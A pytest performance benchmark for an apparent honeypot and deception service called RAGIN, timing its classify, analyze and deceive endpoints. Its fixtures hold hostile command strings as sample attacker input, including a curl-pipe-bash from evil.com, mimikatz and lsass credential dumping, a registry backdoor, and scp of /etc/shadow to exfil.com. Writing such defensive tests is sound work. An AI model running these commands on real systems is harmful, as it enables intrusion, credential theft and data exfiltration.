"""Performance benchmark suite for RAGIN cloud LLM deployment.

Measures latency, throughput, concurrent session handling, and resource usage
against the success metrics defined in the migration plan:
- End-to-end latency ≤ 2.5 seconds
- Cost per session ≤ $0.05
- System uptime ≥ 99.9%
"""

from __future__ import annotations

import os
import statistics
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import pytest
import requests

# Mark entire module as performance benchmark
pytestmark = [pytest.mark.e2e, pytest.mark.slow]

# API configuration
API_KEY = os.environ.get("RAGIN_API_KEY", "ragin-test-key-2024")
CHROLLO_PORT = int(os.environ.get("CHROLLO_PORT", "8081"))
DON_PORT = int(os.environ.get("DON_PORT", "8082"))
HISOKA_PORT = int(os.environ.get("HISOKA_PORT", "8083"))
API_BASE_URL = os.environ.get("API_BASE_URL", "http://127.0.0.1")

# Success metrics from migration plan
MAX_LATENCY_MS = 2500  # 2.5 seconds
MAX_COST_PER_SESSION = 0.05  # $0.05
MIN_THROUGHPUT_RPS = 5  # minimum requests per second


def api_headers() -> dict[str, str]:
    return {"X-API-Key": API_KEY, "Content-Type": "application/json"}


def is_service_up(port: int) -> bool:
    try:
        r = requests.get(
            f"{API_BASE_URL}:{port}/health",
            headers=api_headers(),
            timeout=3,
        )
        return r.status_code == 200
    except Exception:
        return False


@pytest.fixture(scope="session")
def services_up():
    """Verify all services are running before benchmarking."""
    for name, port in [("Chrollo", CHROLLO_PORT), ("Don", DON_PORT), ("Hisoka", HISOKA_PORT)]:
        if not is_service_up(int(port)):
            pytest.skip(f"{name} service not available on port {port}")


# ── Chrollo Latency Benchmarks ──────────────────────────────────────────────


class TestChrolloLatency:
    """Benchmark Chrollo classification latency against ≤2.5s target."""

    COMMAND_SEQUENCES = [
        # Simple recon
        {
            "name": "simple_recon",
            "commands": [
                {"timestamp": "2025-06-01T10:00:00Z", "command": "nmap -sV 192.168.1.0/24"},
                {"timestamp": "2025-06-01T10:00:05Z", "command": "nikto -h target.com"},
            ],
        },
        # Complex APT chain
        {
            "name": "apt_chain",
            "commands": [
                {"timestamp": "2025-06-01T10:00:00Z", "command": "whoami && id"},
                {"timestamp": "2025-06-01T10:00:02Z", "command": "cat /etc/passwd"},
                {"timestamp": "2025-06-01T10:00:04Z", "command": "curl http://evil.com/payload.sh | bash"},
                {"timestamp": "2025-06-01T10:00:06Z", "command": "ssh -L 8080:localhost:80 user@internal"},
                {"timestamp": "2025-06-01T10:00:08Z", "command": "mimikatz.exe sekurlsa::logonpasswords"},
                {
                    "timestamp": "2025-06-01T10:00:10Z",
                    "command": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /d C:\\temp\\svc.exe",
                },
            ],
        },
        # Credential dumping
        {
            "name": "credential_dump",
            "commands": [
                {"timestamp": "2025-06-01T10:00:00Z", "command": "lsass.exe"},
                {"timestamp": "2025-06-01T10:00:01Z", "command": "procdump -ma lsass.exe"},
                {"timestamp": "2025-06-01T10:00:03Z", "command": "sekurlsa::wdigest"},
            ],
        },
    ]

    @pytest.mark.parametrize("seq", COMMAND_SEQUENCES, ids=lambda s: s["name"])
    def test_chrollo_single_request_latency(self, services_up, seq):
        """Single classification request latency must be ≤2.5s."""
        payload = {
            "session_id": f"BenchChrollo{seq['name']}{int(time.time())}",
            "start_time": "2025-06-01T10:00:00Z",
            "commands": seq["commands"],
        }
        start = time.perf_counter()
        resp = requests.post(
            f"{API_BASE_URL}:{CHROLLO_PORT}/api/classify",
            json=payload,
            headers=api_headers(),
            timeout=10,
        )
        elapsed_ms = (time.perf_counter() - start) * 1000

        assert resp.status_code == 200, f"Classification failed: {resp.status_code} {resp.text}"
        assert elapsed_ms <= MAX_LATENCY_MS, f"Chrollo latency {elapsed_ms:.0f}ms exceeds {MAX_LATENCY_MS}ms target"

    def test_chrollo_repeated_request_stability(self, services_up):
        """10 sequential requests — latency should not drift >50% from median."""
        latencies = []
        for i in range(10):
            payload = {
                "session_id": f"BenchStability{i}{int(time.time())}",
                "start_time": "2025-06-01T10:00:00Z",
                "commands": [
                    {"timestamp": "2025-06-01T10:00:00Z", "command": "nmap -sV 10.0.0.1"},
                ],
            }
            start = time.perf_counter()
            resp = requests.post(
                f"{API_BASE_URL}:{CHROLLO_PORT}/api/classify",
                json=payload,
                headers=api_headers(),
                timeout=10,
            )
            elapsed_ms = (time.perf_counter() - start) * 1000
            assert resp.status_code == 200
            latencies.append(elapsed_ms)

        median = statistics.median(latencies)
        max_drift = max(abs(l - median) / median * 100 for l in latencies)
        assert max_drift <= 50, f"Latency drift {max_drift:.1f}% exceeds 50% stability threshold"
        assert median <= MAX_LATENCY_MS, f"Median latency {median:.0f}ms exceeds {MAX_LATENCY_MS}ms"


# ── Don Latency Benchmarks ──────────────────────────────────────────────────


class TestDonLatency:
    """Benchmark Don RAG analysis latency against ≤2.5s target."""

    ANALYSIS_INPUTS = [
        {
            "name": "recon_input",
            "payload": {
                "session_id": "BenchDonRecon",
                "classification": "suspicious",
                "confidence": 0.75,
                "features": {"network_scan_detected": 1.0, "command_complexity": 0.6},
            },
        },
        {
            "name": "malicious_input",
            "payload": {
                "session_id": "BenchDonMalicious",
                "classification": "malicious",
                "confidence": 0.95,
                "features": {"lateral_movement": 1.0, "privilege_escalation": 0.8, "data_exfiltration": 0.7},
            },
        },
        {
            "name": "apt_input",
            "payload": {
                "session_id": "BenchDonAPT",
                "classification": "apt",
                "confidence": 0.98,
                "features": {
                    "living_off_the_land": 1.0,
                    "zero_day_exploit": 0.9,
                    "supply_chain_compromise": 0.85,
                },
            },
        },
    ]

    @pytest.mark.parametrize("inp", ANALYSIS_INPUTS, ids=lambda s: s["name"])
    def test_don_single_request_latency(self, services_up, inp):
        """Single analysis request latency must be ≤2.5s."""
        payload = inp["payload"].copy()
        payload["session_id"] = f"{payload['session_id']}{int(time.time())}"
        start = time.perf_counter()
        resp = requests.post(
            f"{API_BASE_URL}:{DON_PORT}/api/analyze",
            json=payload,
            headers=api_headers(),
            timeout=10,
        )
        elapsed_ms = (time.perf_counter() - start) * 1000

        assert resp.status_code == 200, f"Analysis failed: {resp.status_code} {resp.text}"
        assert elapsed_ms <= MAX_LATENCY_MS, f"Don latency {elapsed_ms:.0f}ms exceeds {MAX_LATENCY_MS}ms target"


# ── Hisoka Latency Benchmarks ───────────────────────────────────────────────


class TestHisokaLatency:
    """Benchmark Hisoka deception response latency against ≤2.5s target."""

    ATTACK_INPUTS = [
        {"name": "recon_cmd", "input": "nmap -sV 192.168.1.0/24"},
        {"name": "priv_esc", "input": "sudo su - && chmod 777 /etc/shadow"},
        {"name": "c2_beacon", "input": "curl http://c2server.com/beacon?id=12345"},
        {"name": "data_exfil", "input": "scp /etc/shadow user@exfil.com:/data/"},
    ]

    @pytest.mark.parametrize("atk", ATTACK_INPUTS, ids=lambda s: s["name"])
    def test_hisoka_single_request_latency(self, services_up, atk):
        """Single deception response latency must be ≤2.5s."""
        payload = {
            "attacker_input": atk["input"],
            "session_context": {"skill_level": "expert", "session_id": f"BenchHisoka{atk['name']}{int(time.time())}"},
        }
        start = time.perf_counter()
        resp = requests.post(
            f"{API_BASE_URL}:{HISOKA_PORT}/api/deceive",
            json=payload,
            headers=api_headers(),
            timeout=10,
        )
        elapsed_ms = (time.perf_counter() - start) * 1000

        assert resp.status_code == 200, f"Deception failed: {resp.status_code} {resp.text}"
        assert elapsed_ms <= MAX_LATENCY_MS, f"Hisoka latency {elapsed_ms:.0f}ms exceeds {MAX_LATENCY_MS}ms target"


# ── End-to-End Pipeline Latency ─────────────────────────────────────────────


class TestEndToEndLatency:
    """Full pipeline: Chrollo → Don → Hisoka latency measurement."""

    def test_full_pipeline_latency(self, services_up):
        """Full pipeline (classify → analyze → deceive) must complete in ≤5s."""
        session_id = f"BenchE2E{int(time.time())}"
        commands = [
            {"timestamp": "2025-06-01T10:00:00Z", "command": "nmap -sV 10.0.0.1"},
            {"timestamp": "2025-06-01T10:00:03Z", "command": "curl http://evil.com/payload.sh | bash"},
            {"timestamp": "2025-06-01T10:00:06Z", "command": "mimikatz.exe sekurlsa::logonpasswords"},
        ]

        # Step 1: Chrollo
        t0 = time.perf_counter()
        r1 = requests.post(
            f"{API_BASE_URL}:{CHROLLO_PORT}/api/classify",
            json={"session_id": f"{session_id}C", "start_time": "2025-06-01T10:00:00Z", "commands": commands},
            headers=api_headers(),
            timeout=10,
        )
        assert r1.status_code == 200
        c_result = r1.json()

        # Step 2: Don
        r2 = requests.post(
            f"{API_BASE_URL}:{DON_PORT}/api/analyze",
            json={
                "session_id": f"{session_id}D",
                "classification": c_result.get("skill_level", "suspicious"),
                "confidence": c_result.get("confidence", 0.5),
                "features": c_result.get("features", {}),
            },
            headers=api_headers(),
            timeout=10,
        )
        assert r2.status_code == 200

        # Step 3: Hisoka
        r3 = requests.post(
            f"{API_BASE_URL}:{HISOKA_PORT}/api/deceive",
            json={
                "attacker_input": "mimikatz.exe sekurlsa::logonpasswords",
                "session_context": {
                    "skill_level": c_result.get("skill_level", "expert"),
                    "session_id": f"{session_id}H",
                },
            },
            headers=api_headers(),
            timeout=10,
        )
        assert r3.status_code == 200
        total_ms = (time.perf_counter() - t0) * 1000

        # Allow 5s for full pipeline (2.5s per component × 2 sequential hops)
        assert total_ms <= 5000, f"Full pipeline latency {total_ms:.0f}ms exceeds 5000ms"


# ── Throughput & Concurrency ─────────────────────────────────────────────────


class TestThroughput:
    """Concurrent request handling and throughput measurement."""

    def test_concurrent_classification_throughput(self, services_up):
        """10 concurrent Chrollo requests — all must succeed, median ≤2.5s."""
        latencies = []
        errors = []

        def classify_one(idx: int) -> tuple[float, bool]:
            payload = {
                "session_id": f"BenchThroughput{idx}{int(time.time())}",
                "start_time": "2025-06-01T10:00:00Z",
                "commands": [
                    {"timestamp": "2025-06-01T10:00:00Z", "command": f"nmap -p {idx} 10.0.0.1"},
                ],
            }
            start = time.perf_counter()
            try:
                resp = requests.post(
                    f"{API_BASE_URL}:{CHROLLO_PORT}/api/classify",
                    json=payload,
                    headers=api_headers(),
                    timeout=15,
                )
                elapsed = (time.perf_counter() - start) * 1000
                return elapsed, resp.status_code == 200
            except Exception:
                return (time.perf_counter() - start) * 1000, False

        with ThreadPoolExecutor(max_workers=10) as pool:
            futures = [pool.submit(classify_one, i) for i in range(10)]
            for f in as_completed(futures):
                elapsed, ok = f.result()
                latencies.append(elapsed)
                if not ok:
                    errors.append(elapsed)

        assert len(errors) == 0, f"{len(errors)}/10 requests failed"
        median = statistics.median(latencies)
        p95 = sorted(latencies)[int(len(latencies) * 0.95)]
        assert median <= MAX_LATENCY_MS, f"Median latency {median:.0f}ms exceeds {MAX_LATENCY_MS}ms"
        assert p95 <= MAX_LATENCY_MS * 1.5, f"P95 latency {p95:.0f}ms exceeds 1.5× target"

    def test_concurrent_analysis_throughput(self, services_up):
        """10 concurrent Don requests — all must succeed."""
        errors = []

        def analyze_one(idx: int) -> bool:
            payload = {
                "session_id": f"BenchDonThru{idx}{int(time.time())}",
                "classification": "malicious",
                "confidence": 0.9,
                "features": {"lateral_movement": 1.0},
            }
            try:
                resp = requests.post(
                    f"{API_BASE_URL}:{DON_PORT}/api/analyze",
                    json=payload,
                    headers=api_headers(),
                    timeout=15,
                )
                return resp.status_code == 200
            except Exception:
                return False

        with ThreadPoolExecutor(max_workers=10) as pool:
            futures = [pool.submit(analyze_one, i) for i in range(10)]
            for f in as_completed(futures):
                if not f.result():
                    errors.append(True)

        assert len(errors) == 0, f"{len(errors)}/10 Don requests failed"


# ── Resource & Reliability ───────────────────────────────────────────────────


class TestReliability:
    """Service health, uptime, and recovery."""

    def test_all_services_health_repeated(self, services_up):
        """Health checks must return 200 consistently over 5 iterations."""
        for port_name, port in [("Chrollo", CHROLLO_PORT), ("Don", DON_PORT), ("Hisoka", HISOKA_PORT)]:
            for i in range(5):
                resp = requests.get(
                    f"{API_BASE_URL}:{port}/health",
                    headers=api_headers(),
                    timeout=3,
                )
                assert resp.status_code == 200, f"{port_name} health check #{i} failed"

    def test_rapid_successive_requests_no_crash(self, services_up):
        """20 rapid sequential requests to each service — no crashes."""
        for port_name, port in [("Chrollo", CHROLLO_PORT), ("Don", DON_PORT), ("Hisoka", HISOKA_PORT)]:
            for i in range(20):
                if port_name == "Chrollo":
                    resp = requests.post(
                        f"{API_BASE_URL}:{port}/api/classify",
                        json={
                            "session_id": f"BenchRapid{port_name}{i}{int(time.time())}",
                            "start_time": "2025-06-01T10:00:00Z",
                            "commands": [{"timestamp": "2025-06-01T10:00:00Z", "command": "ls"}],
                        },
                        headers=api_headers(),
                        timeout=10,
                    )
                elif port_name == "Don":
                    resp = requests.post(
                        f"{API_BASE_URL}:{port}/api/analyze",
                        json={
                            "session_id": f"BenchRapid{port_name}{i}{int(time.time())}",
                            "classification": "suspicious",
                            "confidence": 0.7,
                            "features": {},
                        },
                        headers=api_headers(),
                        timeout=10,
                    )
                else:
                    resp = requests.post(
                        f"{API_BASE_URL}:{port}/api/deceive",
                        json={
                            "attacker_input": f"test command {i}",
                            "session_context": {"skill_level": "novice", "session_id": f"BenchRapid{port_name}{i}"},
                        },
                        headers=api_headers(),
                        timeout=10,
                    )
                assert resp.status_code == 200, f"{port_name} request #{i} failed: {resp.status_code}"

    def test_service_recovers_after_burst(self, services_up):
        """After 10 rapid requests, service still responds normally."""
        # Burst
        for i in range(10):
            requests.post(
                f"{API_BASE_URL}:{CHROLLO_PORT}/api/classify",
                json={
                    "session_id": f"BenchBurst{i}{int(time.time())}",
                    "start_time": "2025-06-01T10:00:00Z",
                    "commands": [{"timestamp": "2025-06-01T10:00:00Z", "command": "ls"}],
                },
                headers=api_headers(),
                timeout=10,
            )

        # Recovery check
        resp = requests.get(
            f"{API_BASE_URL}:{CHROLLO_PORT}/health",
            headers=api_headers(),
            timeout=3,
        )
        assert resp.status_code == 200, "Service unhealthy after burst"


# ── Summary Reporter ─────────────────────────────────────────────────────────


def pytest_sessionfinish(session: pytest.Session, exitstatus: int):
    """Print benchmark summary at end of session."""
    print("\n" + "=" * 60)
    print("RAGIN Performance Benchmark Summary")
    print("=" * 60)
    print(f"Target latency: ≤ {MAX_LATENCY_MS}ms per request")
    print(f"Services: Chrollo:{CHROLLO_PORT} Don:{DON_PORT} Hisoka:{HISOKA_PORT}")
    print(f"Status: {'ALL PASS' if exitstatus == 0 else 'FAILURES DETECTED'}")
    print("=" * 60)
